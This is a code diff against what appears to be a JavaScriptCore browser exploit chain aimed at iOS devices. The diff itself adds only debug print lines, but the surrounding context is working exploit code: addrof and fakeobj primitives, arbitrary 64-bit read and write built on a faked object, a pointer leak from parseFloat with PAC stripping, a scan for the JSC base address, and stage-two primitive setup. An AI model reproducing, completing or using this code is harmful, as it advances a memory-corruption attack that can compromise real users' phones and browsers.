@@ -17672,6 +17672,7 @@ async function _aarw_main() {
           function fakeobj(addr) {
               return p_rce.fakeobj(addr.asDouble());
           }
+          print("stage1 prim: helpers installed");
           let junk0 = new Array(4).fill(1.1);
           junk0[0] = 1.1;
           junk0[1] = 1.1;
@@ -17681,8 +17682,10 @@ async function _aarw_main() {
           let results = new Array(2).fill(1.1);
           results[0] = 1.1;
           results[1] = 1.1;
+          print("stage1 prim: scratch arrays allocated");
           let change_scribble_holder = { p1: fakeobj(0x0108240700006000n), p2: scribble_element };
           let change_scribble = fakeobj(addrof(change_scribble_holder) + 0x10n);
+          print("stage1 prim: change scribble object ready");
           for (let i = 0; i < 2; i++) {
               let a = i == 0 ? change_scribble : junk0;
               results[i] = a[0];
@@ -17695,6 +17698,7 @@ async function _aarw_main() {
           let double_array_cell = BigInt.fromDouble(change_scribble[0]);
           change_scribble_holder.p1 = fakeobj(double_array_cell);
           const original_cell = change_scribble[0];
+          print("stage1 prim: double array cell captured");
 
           function write64(addr, value) {
               change_scribble[0] = original_cell;
@@ -17719,8 +17723,10 @@ async function _aarw_main() {
                   write64(off_addr, off_val);
               }
           }
+          print("stage1 prim: write64 helper installed");
 
           let read64_biguint64arr = new BigUint64Array(4);
+          print("stage1 prim: read64 backing array allocated");
           change_scribble[1] = addrof(read64_biguint64arr).add(8n).asDouble();
           let read64_float64arr_bytes = BigInt.fromDouble(scribble_element[1]);
           read64_biguint64arr[0] = 0x10000000006n;
@@ -17744,6 +17750,7 @@ async function _aarw_main() {
               return (BigInt(read64_str.charCodeAt(0))
                   | BigInt(read64_str.charCodeAt(1)) << 16n);
           }
+          print("stage1 prim: read64/read32 helpers installed");
           print("after setting up prims");
           print("gc disable: version parse begin");
           const gcDisableIosVersion = (function() {
@@ -17786,6 +17793,7 @@ async function _aarw_main() {
           const executable = read64(addrof(parseFloat) + 0x18n);
           globalFuncParseFloat = read64(executable + 0x28n).noPAC();
           print("globalFuncParseFloat: " + globalFuncParseFloat.hex());
+          print("jsc_base scan begin");
           const jsc_base = (function() {
               let jsc_base = globalFuncParseFloat & ~0xfffn;
 
@@ -18421,18 +18429,22 @@ const device_chipset = {
         function setup_stage2_prim()
         {
           print("setup_stage2: begin");
+          print("setup_stage2: addrof install begin");
           p.addrof = function addrof(o) {
             boxed_arr[0] = o;
             return BigInt.fromDouble(unboxed_arr[0]);
-          }        
+          }
+          print("setup_stage2: addrof install done");
+          print("setup_stage2: fakeobj install begin");
           p.fakeobj = function fakeobj(addr) {
             unboxed_arr[0] = addr.asDouble();
             return boxed_arr[0];
           }
-          print("setup_stage2: addrof/fakeobj installed");
+          print("setup_stage2: fakeobj install done");
           let scribble_element;
           let scribbles = [];
           let prev_addr = 0n;
+          print("setup_stage2: local state allocated");
           print("setup_stage2: stride search begin");
           for (let i = 0; i < 1000; ++i) {
             let o = {
